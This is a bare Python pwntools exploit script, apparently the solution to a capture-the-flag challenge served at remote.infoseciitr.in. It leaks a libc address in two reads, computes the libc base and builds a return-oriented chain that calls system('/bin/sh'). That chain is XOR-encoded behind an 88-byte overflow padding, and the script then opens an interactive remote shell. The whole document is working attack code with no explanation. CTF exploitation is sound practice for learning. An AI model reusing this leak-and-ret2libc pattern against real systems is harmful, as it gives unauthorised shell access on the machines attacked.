#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

def xor_encode(desired: bytes, key: int) -> bytes:
    k = key.to_bytes(8, 'little')
    return bytes([ desired[i] ^ k[i % 8] for i in range(len(desired)) ])

io = remote("remote.infoseciitr.in", 8005)

io.sendafter(b": ", b'\x00'*4)
io.recvuntil(b"essence: ")
low  = io.recvline().strip()

io.sendafter(b": ", b'\x00'*4)
io.recvuntil(b"essence: ")
high = io.recvline().strip()

libc.address = u64(low + high) - libc.sym.system

rop  = b''
rop += p64(libc.address + 0x2882f)
rop += p64(libc.address + 0x10f78b)
rop += p64(next(libc.search(b'/bin/sh\x00')))
rop += p64(libc.sym.system)

io.send(xor_encode(b'A'*88 + rop, libc.sym.system))
io.clean() ; io.interactive()

